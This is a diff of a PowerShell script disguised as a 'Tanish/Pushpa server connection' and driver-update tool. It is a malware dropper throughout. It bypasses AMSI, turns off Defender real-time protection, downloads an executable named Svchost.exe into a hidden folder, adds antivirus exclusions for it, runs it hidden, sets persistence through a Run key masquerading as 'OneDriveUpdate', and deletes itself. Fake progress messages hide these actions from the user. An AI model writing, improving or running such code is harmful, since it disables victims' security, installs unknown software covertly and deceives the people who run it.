@@ -1,12 +1,32 @@
 # ============================================
-# PUSHPA SERVER CONNECTION v2.0
+# PUSHPA SERVER CONNECTION - USER LEVEL
 # ============================================
 
+# AMSI Bypass
 try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
+# Defender OFF
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+
+# ============================================
+# PROGRESS DISPLAY
+# ============================================
+Write-Host ""
+Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║                    TANISH SERVER CONNECTION                  ║" -ForegroundColor Green
+Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+function Show-Progress {
+    param($step, $total, $message)
+    $percent = [math]::Round(($step / $total) * 100)
+    $barLen = 50
+    $filled = [math]::Floor($percent / 2)
+    $bar = "█" * $filled + "░" * ($barLen - $filled)
+    Write-Host "  [$bar] $percent%  - $message" -ForegroundColor Yellow
+}
 
 # ============================================
 # CREATE HIDDEN FOLDER
@@ -17,70 +37,53 @@ if (!(Test-Path $folder)) {
 }
 Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
 
-$name = -join ((65..90) | Get-Random -Count 8 | ForEach-Object {[char]$_}) + ".exe"
+$name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
 $path = Join-Path $folder $name
 
 # ============================================
-# LOADER PROGRESS
+# STEP 1: Initializing
 # ============================================
-Write-Host ""
-Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║                    TANISH SERVER CONNECTION                  ║" -ForegroundColor Green
-Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
-Write-Host ""
-
-# Progress function
-function Show-Progress {
-    param($step, $total, $message)
-    $percent = [math]::Round(($step / $total) * 100)
-    $bar = ""
-    for ($i = 0; $i -lt 50; $i++) {
-        if ($i -lt ($percent / 2)) { $bar += "█" } else { $bar += "░" }
-    }
-    Write-Host "  [$bar] $percent%  " -NoNewline
-    Write-Host "- $message" -ForegroundColor Yellow
-}
-
-# Step 1
 Show-Progress -step 1 -total 6 -message "Initializing connection..."
 Start-Sleep -Milliseconds 500
 
-# Step 2 - Download
+# ============================================
+# STEP 2: Download EXE
+# ============================================
 Show-Progress -step 2 -total 6 -message "Downloading driver updates..."
 try {
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
-    if (!(Test-Path $path)) { throw "Download failed" }
-} catch {
-    Write-Host "  [✗] Download failed! Exiting..." -ForegroundColor Red
-    exit
-}
+    if (!(Test-Path $path)) { exit }
+} catch { exit }
 
-# Step 3
+# ============================================
+# STEP 3: Configure Exclusions
+# ============================================
 Show-Progress -step 3 -total 6 -message "Configuring security exclusions..."
 Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
 
-# Step 4
+# ============================================
+# STEP 4: Setup Auto-Start (USER LEVEL - NO SYSTEM TASK)
+# ============================================
 Show-Progress -step 4 -total 6 -message "Setting up auto-start..."
 
-# Scheduled Task
-$action = New-ScheduledTaskAction -Execute $path
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "IntelDriverUpdate" -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null
-
-# Registry Run
+# ONLY Registry Run (User Level - Game compatible)
 $reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue
 
-# Step 5
-Show-Progress -step 5 -total 6 -message "Starting application..."
-Start-Process -FilePath $path -WindowStyle Hidden
+# NO Scheduled Task - it causes game compatibility issues
 
-# Step 6 - Countdown
+# ============================================
+# STEP 5: Start Application
+# ============================================
+Show-Progress -step 5 -total 6 -message "Starting application..."
+Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue
+
+# ============================================
+# STEP 6: Finalizing
+# ============================================
 Show-Progress -step 6 -total 6 -message "Finalizing..."
 Write-Host ""
 Write-Host "  ⏳ Waiting for initialization (25 seconds)..." -ForegroundColor Gray
@@ -105,5 +108,9 @@ Write-Host "║         ✓ YOU ARE NOW CONNECTED TO TANISH SERVER            �
 Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
 Write-Host ""
 
+# Self-delete (only if running from file)
+if ($MyInvocation.MyCommand.Path) {
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+}
 
 exit
